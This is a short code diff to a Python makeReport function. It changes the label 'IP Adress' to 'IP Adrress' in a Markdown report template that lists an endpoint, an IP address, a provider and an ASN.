@@ -131,7 +131,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **End Point:** `{endpoint}`
             
-**IP Adress:**
+**IP Adrress:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
